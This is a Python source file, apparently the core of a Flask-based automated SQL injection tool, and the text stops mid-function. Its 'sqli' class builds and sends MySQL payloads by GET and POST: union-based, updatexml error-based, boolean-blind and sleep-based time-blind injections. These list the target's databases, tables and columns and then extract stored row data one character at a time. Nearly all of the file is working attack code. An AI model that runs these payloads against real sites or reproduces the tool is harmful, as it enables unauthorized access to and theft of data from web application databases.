from flask import Flask, render_template, request
import requests
import re
import datetime


# coding:utf-8
import glo
import scan


class sqli:
    header = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
        "Cache-Control": "max-age=0",
        "Connection": "keep-alive",
        "Content-Length": "42",
        "Content-Type": "application/x-www-form-urlencoded",
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "Windows",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36 Edg/103.0.1264.37"
    }

    def __init__(self, id, url, value, column, method, close='', exegesis='', position=0, column_num=0):
        if close != '':
            self.close = close
        else:
            if glo.v1 is not None:
                self.close = glo.v1.listClose[glo.v1.i]
                print(self.close)
            else:
                print('error of close!')
        if exegesis != '':
            self.exegesis = exegesis
        else:
            if glo.v1 is not None:
                self.exegesis = glo.v1.exegesis[glo.v1.e]
                print(self.exegesis)
            else:
                print('error of exegesis!')
        print('self.close',self.close)
        self.id = id
        print(id)
        print(self.id)
        print(glo.get_infor("id1"))
        self.value = value
        self.column = column
        self.position = position
        self.column_num = column_num
        self.method = method
        if method == 'get':
            self.url = f"{url}?{id}={value}{self.close} "
        else:
            self.url = url


    length = 25
    max = 1000
    tablelist = []
    datalen = {'databaseLen': 'length(database())',
               'tableCount': '(select count(table_name) from information_schema.tables where table_schema=database())',
               'columnCount': 'select count(column_name) from information_schema.columns where table_schema=database() and table_name =',
               'columnLen': 'length((select column_name from information_schema.columns where table_schema=database() and table_name = ))'}
    timedatalen = {'databaseLen': 'length(database())',
                   'tableCount': '(select count(table_name) from information_schema.tables where table_schema=database())',
                   'columnCount': 'select count(column_name) from information_schema.columns where table_schema=database() and table_name =',
                   'columnLen': 'length((select column_name from information_schema.columns where table_schema=database() and table_name = ))'}

    def prints(self, value):
        answer = glo.get_answer()
        answer += value
        answer += '\n'
        glo.set_answer(answer)

    def set_result(self, key, value):
        glo.set_result(key, value)
        glo.set_result(key, '\n')

    def unionSentence(self, content):
        part = f"group_concat('***',{content},'***,')"
        payload = ""
        for i in range(1, self.column_num):
            if i != self.position:
                payload += str(i)
            else:
                payload += part
            payload += ','
        if self.column_num != self.position:
            payload += str(self.column_num)
        else:
            payload += part
        return payload

    def getUnionDatabase(self, column_num, position):
        self.column_num = column_num
        self.position = position
        payload = self.unionSentence('schema_name')
        paloadDb = f"union (select {payload} from information_schema.schemata){self.exegesis}"
        paloadDb += self.column
        url = self.url + paloadDb
        data = requests.get(url=url)
        print(self.id)
        print(url)
        r = r"\*{3}([^,]*)\*{3}"
        unionDbList = re.findall(r, data.text)
        self.prints("【databases】")
        for i in range(len(unionDbList)):
            unionDbList[i] = str(unionDbList[i])
            print(unionDbList[i])
            self.prints(unionDbList[i])
            self.set_result('getUnionDatabase', unionDbList[i])
        print(url,'——url')

    def postUnionDatabase(self, column_num, position):
        self.column_num = column_num
        self.position = position
        payload = self.unionSentence('schema_name')
        postDb = {
            f"{self.id}": f"{self.value}{self.close} union (select {payload} from information_schema.schemata){self.exegesis}", }
        postDb.update(self.column)
        data = requests.post(self.url, headers=self.header, data=postDb)  # %23 <==> --+
        r = r"\*{3}([^,]*)\*{3}"
        unionDbList = re.findall(r, data.text)
        self.prints("【databases】")
        for i in range(len(unionDbList)):
            unionDbList[i] = str(unionDbList[i])
            print(unionDbList[i])
            self.prints(unionDbList[i])
            self.set_result('postUnionDatabase', unionDbList[i])
        print('---')

    def getUnionTable(self):
        payload = self.unionSentence('table_name')
        paloadTb = f"union select {payload} from information_schema.tables where table_schema=database(){self.exegesis}"
        paloadTb += self.column
        url = self.url + paloadTb
        data = requests.get(url=url)
        r = r"\*{3}([^,]*)\*{3}"
        unionTbList = re.findall(r, data.text)
        self.prints("【tables】")
        for i in range(len(unionTbList)):
            unionTbList[i] = str(unionTbList[i])
            print(unionTbList[i])
            self.prints(unionTbList[i])
            self.set_result('getUnionTable', unionTbList[i])
        print('***')

    def postUnionTable(self):
        payload = self.unionSentence('table_name')
        postTb = {
            f"{self.id}": f"{self.value}{self.close} union select {payload} from information_schema.tables where table_schema=database(){self.exegesis}", }
        postTb.update(self.column)
        data = requests.post(self.url, headers=self.header, data=postTb)  # %23 <==> --+
        r = r"\*{3}([^,]*)\*{3}"
        unionTbList = re.findall(r, data.text)
        self.prints("【tables】")
        for i in range(len(unionTbList)):
            unionTbList[i] = str(unionTbList[i])
            print(unionTbList[i])
            self.prints(unionTbList[i])
            self.set_result('postUnionTable', unionTbList[i])
        print('---')

    def getUnionColumn(self, table_name):
        payload = self.unionSentence('column_name')
        paloadCl = f"union select {payload} from information_schema.columns where table_schema=database() and table_name= '{table_name}'{self.exegesis}"
        paloadCl += self.column
        url = self.url + paloadCl
        print(self.url)
        data = requests.get(url=url)
        r = r"\*{3}([^,]*)\*{3}"
        unionClList = re.findall(r, data.text)
        self.prints("【columns】")
        for i in range(len(unionClList)):
            unionClList[i] = str(unionClList[i])
            print(unionClList[i])
            self.prints(unionClList[i])
            self.set_result('getUnionColumn', unionClList[i])
        print('***')

    def postUnionColumn(self, table_name):
        payload = self.unionSentence('column_name')
        postCl = {
            f"{self.id}": f"{self.value}{self.close} union select {payload} from information_schema.columns where table_schema=database() and table_name='{table_name}'{self.exegesis}", }
        postCl.update(self.column)
        data = requests.post(self.url, headers=self.header, data=postCl)  # %23 <==> --+
        r = r"\*{3}([^,]*)\*{3}"
        unionClList = re.findall(r, data.text)
        self.prints("【columns】")
        for i in range(len(unionClList)):
            unionClList[i] = str(unionClList[i])
            print(unionClList[i])
            self.prints(unionClList[i])
            self.set_result('postUnionColumn', unionClList[i])
        print('---')

    def getUnionData(self, tl, cl):
        part = f"concat_ws('         ',{cl})"
        payload = self.unionSentence(part)
        paloadDt = f"union select {payload} from ({tl}){self.exegesis}"
        paloadDt += self.column
        url = self.url + paloadDt
        data = requests.get(url=url)
        r = r"\*{3}([^,]*)\*{3}"
        unionDtList = re.findall(r, data.text)
        self.prints("【datas】")
        for i in range(len(unionDtList)):
            unionDtList[i] = str(unionDtList[i])
            print(unionDtList[i])
            self.prints(unionDtList[i])
            self.set_result('getUnionData', unionDtList[i])
        print('***')

    def postUnionData(self, tl, cl):
        part = f"concat_ws('         ',{cl})"
        payload = self.unionSentence(part)
        postDt = {
            f"{self.id}": f"{self.value}{self.close} union select {payload} from ({tl}){self.exegesis}", }
        postDt.update(self.column)
        data = requests.post(self.url, headers=self.header, data=postDt)  # %23 <==> --+
        r = r"\*{3}([^,]*)\*{3}"
        unionDtList = re.findall(r, data.text)
        self.prints("【datas】")
        for i in range(len(unionDtList)):
            unionDtList[i] = str(unionDtList[i])
            print(unionDtList[i])
            self.prints(unionDtList[i])
            self.set_result('postUnionData', unionDtList[i])
        print('---')

    def getErrorDatabase(self):
        flag = True
        startnum = 1
        printRe = ""
        while flag:
            paloadDb = f"and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),{startnum},{self.length}),'***'),1){self.exegesis}"
            paloadDb += self.column
            url1 = self.url + paloadDb
            data = requests.get(url=url1)
            r = r"~(.*)\*{3}"
            errorDbList = re.findall(r, data.text)
            for i in range(len(errorDbList)):
                errorDbList[i] = str(errorDbList[i])
                print(errorDbList[i])
                printRe += errorDbList[i]
                if errorDbList[i] == "":
                    flag = False
            startnum += self.length
            if startnum > self.max:
                flag = False
        print(printRe)
        self.prints("【databases】")
        self.prints(printRe)
        self.set_result('getErrorDatabase', printRe)
        print('***')

    def postErrorDatabase(self):
        flag = True
        startnum = 1
        printRe = ""
        while flag:
            postDb = {
                f"{self.id}": f"{self.value}{self.close} and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),{startnum},{self.length}),'***'),1){self.exegesis}", }
            postDb.update(self.column)
            data = requests.post(self.url, headers=self.header, data=postDb)  # %23 <==> --+
            r = r"~(.*)\*{3}"
            errorDbList = re.findall(r, data.text)
            for i in range(len(errorDbList)):
                errorDbList[i] = str(errorDbList[i])
                print(errorDbList[i])
                printRe += errorDbList[i]
                if errorDbList[i] == "":
                    flag = False
            startnum += self.length
            if startnum > self.max:
                flag = False
        print(printRe)
        self.prints("【databases】")
        self.prints(printRe)
        self.set_result('postErrorDatabase', printRe)
        print('---')

    def getErrorTable(self):
        flag = True
        startnum = 1
        printRe = ""
        while flag:
            paloadTb = f"and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{startnum},{self.length}),'***'),1){self.exegesis}"
            paloadTb += self.column
            url1 = self.url + paloadTb
            data = requests.get(url=url1)
            r = r"~(.*)\*{3}"
            errorTbList = re.findall(r, data.text)
            for i in range(len(errorTbList)):
                errorTbList[i] = str(errorTbList[i])
                print(errorTbList[i])
                printRe += errorTbList[i]
                if errorTbList[i] == "":
                    flag = False
            startnum += self.length
            if startnum > self.max:
                flag = False
        print(printRe)
        self.prints("【tables】")
        self.prints(printRe)
        self.set_result('getErrorTable', printRe)
        print('***')

    def postErrorTable(self):
        flag = True
        startnum = 1
        printRe = ""
        while flag:
            postTb = {
                f"{self.id}": f"{self.value}{self.close} and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{startnum},{self.length}),'***'),1){self.exegesis}", }
            postTb.update(self.column)
            data = requests.post(self.url, headers=self.header, data=postTb)  # %23 <==> --+
            r = r"~(.*)\*{3}"
            errorTbList = re.findall(r, data.text)
            for i in range(len(errorTbList)):
                errorTbList[i] = str(errorTbList[i])
                print(errorTbList[i])
                printRe += errorTbList[i]
                if errorTbList[i] == "":
                    flag = False
            startnum += self.length
            if startnum > self.max:
                flag = False
        print(printRe)
        self.prints("【tables】")
        self.prints(printRe)
        self.set_result('postErrorTable', printRe)
        print('---')

    def getErrorColumn(self, tb):
        flag = True
        startnum = 1
        printRe = ""
        while flag:
            paloadCl = f"and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name='{tb}'),{startnum},{self.length}),'***'),1){self.exegesis}"
            paloadCl += self.column
            url1 = self.url + paloadCl
            data = requests.get(url=url1)
            r = r"~(.*)\*{3}"
            errorClList = re.findall(r, data.text)
            for i in range(len(errorClList)):
                errorClList[i] = str(errorClList[i])
                print(errorClList[i])
                printRe += errorClList[i]
                if errorClList[i] == "":
                    flag = False
            startnum += self.length
            if startnum > self.max:
                flag = False
        print(printRe)
        self.prints("【columns】")
        self.prints(printRe)
        self.set_result('getErrorColumn', printRe)
        print('***')

    def postErrorColumn(self, tb):
        flag = True
        startnum = 1
        printRe = ""
        while flag:
            postCl = {
                f"{self.id}": f"{self.value}{self.close} and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name='{tb}'),{startnum},{self.length}),'***'),1){self.exegesis}", }
            postCl.update(self.column)
            data = requests.post(self.url, headers=self.header, data=postCl)  # %23 <==> --+
            r = r"~(.*)\*{3}"
            errorClList = re.findall(r, data.text)
            for i in range(len(errorClList)):
                errorClList[i] = str(errorClList[i])
                print(errorClList[i])
                printRe += errorClList[i]
                if errorClList[i] == "":
                    flag = False
            startnum += self.length
            if startnum > self.max:
                flag = False
        print(printRe)
        self.prints("【columns】")
        self.prints(printRe)
        self.set_result('postErrorColumn', printRe)
        print('---')

    def getErrorData(self, tb, cl):
        flag = True
        startnum = 1
        printRe = ""
        while flag:
            paloadDt = f"and updatexml(1,concat(0x7e,substr((select group_concat({cl}) from {tb}),{startnum},{self.length}),'***'),1){self.exegesis}"
            paloadDt += self.column
            url1 = self.url + paloadDt
            data = requests.get(url=url1)
            r = r"~(.*)\*{3}"
            errorDtList = re.findall(r, data.text)
            for i in range(len(errorDtList)):
                errorDtList[i] = str(errorDtList[i])
                print(errorDtList[i])
                printRe += errorDtList[i]
                if errorDtList[i] == "":
                    flag = False
            startnum += self.length
            if startnum > self.max:
                flag = False
        print(printRe)
        self.prints("【datas】")
        self.prints(printRe)
        self.set_result('getErrorData', printRe)
        print('***')

    def postErrorData(self, tb, cl):
        flag = True
        startnum = 1
        printRe = ""
        while flag:
            postDt = {
                f"{self.id}": f"{self.value}{self.close} and updatexml(1,concat(0x7e,substr((select group_concat({cl}) from {tb}),{startnum},{self.length}),'***'),1){self.exegesis}", }
            postDt.update(self.column)
            data = requests.post(self.url, headers=self.header, data=postDt)  # %23 <==> --+
            r = r"~(.*)\*{3}"
            errorDtList = re.findall(r, data.text)
            for i in range(len(errorDtList)):
                errorDtList[i] = str(errorDtList[i])
                print(errorDtList[i])
                printRe += errorDtList[i]
                if errorDtList[i] == "":
                    flag = False
            startnum += self.length
            if startnum > self.max:
                flag = False
        print(printRe)
        self.prints("【datas】")
        self.prints(printRe)
        self.set_result('postErrorData', printRe)
        print('---')

    def getBoolDataLenAndCount(self, datalen):
        payload1 = f'''or length(database())>0{self.exegesis}'''
        payload1 += self.column
        url2 = self.url + payload1
        r2 = requests.get(url2)  # %23 <==> --+
        self.rightText = r2.text
        for i in range(1, 20):
            payloadDl = f'''or {self.datalen[datalen]}={i}{self.exegesis}'''
            payloadDl += self.column
            url1 = self.url + payloadDl
            r1 = requests.get(url1)  # %23 <==> --+
            print(url1)
            if r1.text == r2.text:
                print(datalen, ':', i)
                self.prints(str(i))
                return i

    def postBoolDataLenAndCount(self, datalen):
        post1 = {f"{self.id}": f"{self.value}{self.close} or length(database())>0{self.exegesis}", }
        post1.update(self.column)
        r2 = requests.post(self.url, headers=self.header, data=post1)  # %23 <==> --+
        self.rightText = r2.text
        for i in range(1, 20):
            postDl = {f"{self.id}": f"{self.value}{self.close} or {self.datalen[datalen]}={i}{self.exegesis}", }
            postDl.update(self.column)
            r1 = requests.post(self.url, headers=self.header, data=postDl)  # %23 <==> --+
            print(postDl)
            if r1.text == r2.text:
                print(datalen, ':', i)
                self.prints(str(i))
                return i

    def getBoolTableData(self, tableCount):
        for i in range(0, tableCount):
            for j in range(1, 30):
                payloadTD = f'''or length((select table_name from information_schema.tables where table_schema=database() limit {i},1))={j}'''
                url = self.url + payloadTD + self.exegesis + self.column
                r = requests.get(url)  # %23 <==> --+
                # print(url)
                if r.text == self.rightText:
                    print("第", i + 1, "个表的长度：", j)
                    p = "第" + str(i + 1) + "个表的长度：" + str(j)
                    self.prints(p)
                    self.getBoolTable(j, i)
                    self.tablelist.append(j)
                    print(self.tablelist)

    def postBoolTableData(self, tableCount):
        for i in range(0, tableCount):
            for j in range(1, 30):
                postTD = {
                    f"{self.id}": f"{self.value}{self.close} or length((select table_name from information_schema.tables where table_schema=database() limit {i},1))={j}{self.exegesis}", }
                postTD.update(self.column)
                r = requests.post(self.url, headers=self.header, data=postTD)  # %23 <==> --+
                # print(url)
                if r.text == self.rightText:
                    print("第", i + 1, "个表的长度：", j)
                    p = "第" + str(i + 1) + "个表的长度：" + str(j)
                    self.prints(p)
                    self.postBoolTable(j, i)
                    self.tablelist.append(j)
                    print(self.tablelist)

    def getBoolColumnData(self, columnCount, table_name):
        for i in range(0, columnCount):
            for j in range(1, 30):
                payloadTD = f'''or length((select column_name from information_schema.columns where table_schema=database() and table_name = '{table_name}' limit {i},1))={j}'''
                url = self.url + payloadTD + self.exegesis + self.column
                r = requests.get(url)  # %23 <==> --+
                # print(url)
                if r.text == self.rightText:
                    print("第", i + 1, "个字段的长度：", j)
                    p = "第" + str(i + 1) + "个字段的长度：" + str(j)
                    self.prints(p)
                    self.getBoolColumn(j, i, table_name)

    def postBoolColumnData(self, columnCount, table_name):
        for i in range(0, columnCount):
            for j in range(1, 30):
                postTD = {
                    f"{self.id}": f"{self.value}{self.close} or length((select column_name from information_schema.columns where table_schema=database() and table_name = '{table_name}' limit {i},1))={j}{self.exegesis}", }
                postTD.update(self.column)
                r = requests.post(self.url, headers=self.header, data=postTD)  # %23 <==> --+
                # print(url)
                if r.text == self.rightText:
                    print("第", i + 1, "个字段的长度：", j)
                    p = "第" + str(i + 1) + "个字段的长度：" + str(j)
                    self.prints(p)
                    self.postBoolColumn(j, i, table_name)

    def getBoolDataData(self, dataCount, table_name, column_name):
        for i in range(0, dataCount):
            for j in range(1, 30):
                payloadDD = f'''or length((select {column_name} from {table_name} limit {i},1))={j}'''
                url = self.url + payloadDD + self.exegesis + self.column
                r = requests.get(url)  # %23 <==> --+
                # print(url)
                if r.text == self.rightText:
                    print("第", i + 1, "个字段的长度：", j)
                    p = "第" + str(i + 1) + "个字段的长度：" + str(j)
                    self.prints(p)
                    self.getBoolData(j, i, table_name, column_name)

    def postBoolDataData(self, dataCount, table_name, column_name):
        for i in range(0, dataCount):
            for j in range(1, 30):
                postDD = {f"{self.id}": f"{self.value}{self.close} or length((select {column_name} from {table_name} limit {i},1))={j}{self.exegesis}", }
                postDD.update(self.column)
                print(postDD)
                r = requests.post(self.url, headers=self.header, data=postDD)  # %23 <==> --+
                # print(url)
                if r.text == self.rightText:
                    print("第", i + 1, "个字段值的长度：", j)
                    p = "第" + str(i + 1) + "个字段的长度：" + str(j)
                    self.prints(p)
                    self.postBoolData(j, i, table_name, column_name)

    def getBoolDatabase(self, datalen):
        name = ''
        payload2 = f'''or length(database())>0{self.exegesis}'''
        url2 = self.url + payload2 + self.column
        r2 = requests.get(url2)  # %23 <==> --+
        for j in range(1, datalen + 1):
            for i in '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_':
                payloadDb = f"or substr(database(),{j},1)='{i}'{self.exegesis}"
                url1 = self.url + payloadDb + self.column
                r1 = requests.get(url1)
                if r1.text == r2.text:
                    name = name + i
                    print(name)
                    break
        self.prints(name)
        self.set_result('getBoolDatabase', name)
        print('database_name:', name)

    def postBoolDatabase(self, datalen):
        name = ''
        post2 = {f"{self.id}": f"{self.value}{self.close} or length(database())>0{self.exegesis}", }
        post2.update(self.column)
        r2 = requests.post(self.url, headers=self.header, data=post2)  # %23 <==> --+
        for j in range(1, datalen + 1):
            for i in '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_':
                postDb = {f"{self.id}": f"{self.value}{self.close} or substr(database(),{j},1)='{i}'{self.exegesis}" }
                postDb.update(self.column)
                r1 = requests.post(self.url, headers=self.header, data=postDb)  # %23 <==> --+
                if r1.text == r2.text:
                    name = name + i
                    print(name)
                    break
        self.prints(name)
        self.set_result('postBoolDatabase', name)
        print('database_name:', name)

    def getBoolTable(self, tableLen, n):
        name = ''
        for j in range(1, tableLen + 1):
            for i in '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_':
                payloadDb = f"or substr((select table_name from information_schema.tables where table_schema=database() limit {n},1),{j},1)='{i}'{self.exegesis}"
                url1 = self.url + payloadDb + self.column
                r1 = requests.get(url1)
                # print(url1)
                if r1.text == self.rightText:
                    name = name + i
                    # print(name)
                    break
        self.prints(name)
        self.set_result('getBoolTable', name)
        print('table_name:', name)

    def postBoolTable(self, tableLen, n):
        name = ''
        for j in range(1, tableLen + 1):
            for i in '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_':
                postDb = {
                    f"{self.id}": f"{self.value}{self.close} or substr((select table_name from information_schema.tables where table_schema=database() limit {n},1),{j},1)='{i}'{self.exegesis}"  }
                postDb.update(self.column)
                r1 = requests.post(self.url, headers=self.header, data=postDb)  # %23 <==> --+
                # print(url1)
                if r1.text == self.rightText:
                    name = name + i
                    # print(name)
                    break
        self.prints(name)
        self.set_result('postBoolTable', name)
        print('table_name:', name)

    def getBoolColumn(self, columnLen, n, table_name):
        name = ''
        for j in range(1, columnLen + 1):
            for i in '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_':
                payloadDb = f"or substr((select column_name from information_schema.columns where table_schema=database() and table_name = '{table_name}' limit {n},1),{j},1)='{i}' {self.exegesis}"
                url1 = self.url + payloadDb + self.column
                r1 = requests.get(url1)
                # print(url1)
                if r1.text == self.rightText:
                    name = name + i
                    # print(name)
                    break
        self.prints(name)
        self.set_result('getBoolColumn', name)
        print('column_name:', name)

    def postBoolColumn(self, columnLen, n, table_name):
        name = ''
        for j in range(1, columnLen + 1):
            for i in '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_':
                postDb = {
                    f"{self.id}": f"{self.value}{self.close} or substr((select column_name from information_schema.columns where table_schema=database() and table_name = '{table_name}' limit {n},1),{j},1)='{i}'{self.exegesis}" }
                postDb.update(self.column)
                r1 = requests.post(self.url, headers=self.header, data=postDb)  # %23 <==> --+
                # print(url1)
                if r1.text == self.rightText:
                    name = name + i
                    # print(name)
                    break
        self.prints(name)
        self.set_result('postBoolColumn', name)
        print('column_name:', name)

    def getBoolData(self, dataLen, n, table_name, column_name):
        name = ''
        for j in range(1, dataLen + 1):
            for i in '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_':
                payloadDb = f"or substr((select {column_name} from {table_name} limit {n},1),{j},1)='{i}' {self.exegesis}"
                url1 = self.url + payloadDb + self.column
                r1 = requests.get(url1)
                # print(url1)
                if r1.text == self.rightText:
                    name = name + i
                    # print(name)
                    break
        self.prints(name)
        self.set_result('getBoolData', name)
        print('data_name:', name)

    def postBoolData(self, dataLen, n, table_name, column_name):
        name = ''
        for j in range(1, dataLen + 1):
            for i in '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_':
                postDb = {
                    f"{self.id}": f"{self.value}{self.close} or substr((select {column_name} from {table_name} limit {n},1),{j},1)='{i}'{self.exegesis}"  }
                postDb.update(self.column)
                r1 = requests.post(self.url, headers=self.header, data=postDb)  # %23 <==> --+
                # print(url1)
                if r1.text == self.rightText:
                    name = name + i
                    # print(name)
                    break
        self.prints(name)
        self.set_result('postBoolData', name)
        print('data_name:', name)

    def getTimeDataLenAndCount(self, timedatalen):
        for i in range(1, 20):
            payloadDl = f'''or if({self.timedatalen[timedatalen]}={i},sleep(3),1){self.exegesis}'''
            url1 = self.url + payloadDl + self.column
            time1 = datetime.datetime.now()
            r1 = requests.get(url1)  # %23 <==> --+
            time2 = datetime.datetime.now()
            sec = (time2 - time1).seconds
            print(url1)
            if sec >= 3:
                print(timedatalen, ':', i)
                self.prints(str(i))
                return i

    def postTimeDataLenAndCount(self, timedatalen):
        for i in range(1, 20):
            postDl = {f"{self.id}": f"{self.value}{self.close} or if({self.timedatalen[timedatalen]}={i},sleep(3),1){self.exegesis}", }
            postDl.update(self.column)
            time1 = datetime.datetime.now()
            r1 = requests.post(self.url, headers=self.header, data=postDl)  # %23 <==> --+
            time2 = datetime.datetime.now()
            sec = (time2 - time1).seconds
            # print(url1)
            if sec >= 3:
                print(timedatalen, ':', i)
                self.prints(str(i))
                return i

    def getTimeDatabase(self, timedatalen):
        name = ''
        for j in range(1, timedatalen + 1):
            for i in '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_':
                payloadDb = f"or if(substr(database(),{j},1)='{i}',sleep(1),1) {self.exegesis}"
                url1 = self.url + payloadDb + self.column
                time1 = datetime.datetime.now()
                r1 = requests.get(url1)
                time2 = datetime.datetime.now()
                sec = (time2 - time1).seconds
                if sec >= 1:
                    name = name + i
                    print(name)
                    break
        self.prints(name)
        print('database_name:', name)
        self.set_result('getTimeDatabase', name)

    def postTimeDatabase(self, timedatalen):
        name = ''
        for j in range(1, timedatalen + 1):
            for i in '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_':
                postDb = {f"{self.id}": f"{self.value}{self.close} or if(substr(database(),{j},1)='{i}',sleep(1),1){self.exegesis}" }
                postDb.update(self.column)
                time1 = datetime.datetime.now()
                r1 = requests.post(self.url, headers=self.header, data=postDb)  # %23 <==> --+
                time2 = datetime.datetime.now()
                sec = (time2 - time1).seconds
                if sec >= 1:
                    name = name + i
                    print(name)
                    break
        self.prints(name)
        print('database_name:', name)
        self.set_result('postTimeDatabase', name)

    def getTimeTable(self, tableLen, n):
        name = ''
        for j in range(1, tableLen + 1):
            for i in '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_':
                # print(i)
                payloadDb = f"or if(substr((select table_name from information_schema.tables where table_schema=database() limit {n},1),%{j},1)='{i}',sleep(1),1){self.exegesis}"
                url1 = self.url + payloadDb + self.column
                time1 = datetime.datetime.now()
                r1 = requests.get(url1)
                time2 = datetime.datetime.now()
                sec = (time2 - time1).seconds
                # print(url1)
                if sec >= 3:
                    name = name + i
                    # print(name)
                    break
        print('table_name:', name)
        self.set_result('getTimeTable', name)

    def postTimeTable(self, tableLen, n):
        name = ''
        for j in range(1, tableLen + 1):
            for i in '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_':
                # print(i)
                postDb = {
                    f"{self.id}": f"{self.value}{self.close} or if(substr((select table_name from information_schema.tables where table_schema=database() limit {n},1),{j},1)='{i}',sleep(1),1){self.exegesis}"  }
                postDb.update(self.column)
                time1 = datetime.datetime.now()
                r1 = requests.post(self.url, headers=self.header, data=postDb)  # %23 <==> --+
                time2 = datetime.datetime.now()
                sec = (time2 - time1).seconds
                # print(url1)
                if sec >= 3:
                    name = name + i
                    # print(name)
                    break
        print('table_name:', name)
        self.set_result('postTimeTable', name)

    def getTimeTableData(self, tableCount):
        for i in range(0, tableCount):
            for j in range(1, 30):
                # print(j)
                payloadTD = f'''or if(length((select table_name from information_schema.tables where table_schema=database() limit {i},1))={j},sleep(3),1){self.exegesis}'''
                url = self.url + payloadTD + self.column
                time1 = datetime.datetime.now()
                r = requests.get(url)
                time2 = datetime.datetime.now()
                sec = (time2 - time1).seconds
                # print(url)
                if sec >= 3:
                    print("第", i + 1, "个表的长度：", j)
                    p = "第" + str(i + 1) + "个表的长度：" + str(j)
                    self.prints(p)
                    self.getTimeTable(j, i)
                    self.tablelist.append(j)
                    print(self.tablelist)

    def postTimeTableData(self, tableCount):
        for i in range(0, tableCount):
            for j in range(1, 30):
                # print(j)
                postTD = {
                    f"{self.id}": f"{self.value}{self.close} or if(length((select table_name from information_schema.tables where table_schema=database() limit {i},1))={j},sleep(3),1){self.exegesis}", }
                postTD.update(self.column)
                time1 = datetime.datetime.now()
                r1 = requests.post(self.url, headers=self.header, data=postTD)  # %23 <==> --+
                time2 = datetime.datetime.now()
                sec = (time2 - time1).seconds
                # print(url)
                if sec >= 3:
                    print("第", i + 1, "个表的长度：", j)
                    p = "第" + str(i + 1) + "个表的长度：" + str(j)
                    self.prints(p)
                    self.postTimeTable(j, i)
                    self.tablelist.append(j)
                    print(self.tablelist)

    def getTimeColumn(self, columnLen, n, table_name):
        name = ''
        for j in range(1, columnLen + 1):
            for i in '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_':
                payloadDb = f"or if(substr((select column_name from information_schema.columns where table_schema=database() and table_name = '{table_name}' limit {n},1),{j},1)='{i}',sleep(3),1){self.exegesis}"
                url1 = self.url + payloadDb + self.column
                time1 = datetime.datetime.now()
                r1 = requests.get(url1)
                time2 = datetime.datetime.now()
                sec = (time2 - time1).seconds
                # print(url1)
                if sec >= 3:
                    name = name + i
                    # print(name)
                    break
        self.prints(name)
        print('column_name:', name)
        self.set_result('getTimeColumn', name)

    def postTimeColumn(self, columnLen, n, table_name):
        name = ''
        for j in range(1, columnLen + 1):
            for i in '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_':
                postDb = {
                    f"{self.id}": f"{self.value}{self.close} or if(substr((select column_name from information_schema.columns where table_schema=database() and table_name = '{table_name}' limit {n},1),{j},1)='{i}',sleep(3),1){self.exegesis}" }
                postDb.update(self.column)
                time1 = datetime.datetime.now()
                r1 = requests.post(self.url, headers=self.header, data=postDb)  # %23 <==> --+
                time2 = datetime.datetime.now()
                sec = (time2 - time1).seconds
                # print(url1)
                if sec >= 3:
                    name = name + i
                    # print(name)
                    break
        self.prints(name)
        print('column_name:', name)
        self.set_result('postTimeColumn', name)

    def getTimeColumnData(self, columnCount, table_name):
        for i in range(0, columnCount):
            for j in range(1, 30):
                payloadTD = f'''or if(length((select column_name from information_schema.columns where table_schema=database() and table_name = '{table_name}' limit {i},1))={j},sleep(3),1){self.exegesis}'''
                url = self.url + payloadTD + self.column
                time1 = datetime.datetime.now()
                r = requests.get(url)  # %23 <==> --+
                time2 = datetime.datetime.now()
                sec = (time2 - time1).seconds
                # print(url)
                if sec >= 3:
                    print("第", i + 1, "个字段的长度：", j)
                    p = "第" + str(i + 1) + "个字段的长度：" + str(j)
                    self.prints(p)
                    self.getTimeColumn(j, i, table_name)

    def postTimeColumnData(self, columnCount, table_name):
        for i in range(0, columnCount):
            for j in range(1, 30):
                postTD = {
                    f"{self.id}": f"{self.value}{self.close} or if(length((select column_name from information_schema.columns where table_schema=database() and table_name = '{table_name}' limit {i},1))={j},sleep(3),1){self.exegesis}", }
                postTD.update(self.column)
                time1 = datetime.datetime.now()
                r1 = requests.post(self.url, headers=self.header, data=postTD)  # %23 <==> --+
                time2 = datetime.datetime.now()
                sec = (time2 - time1).seconds
                # print(url)
                if sec >= 3:
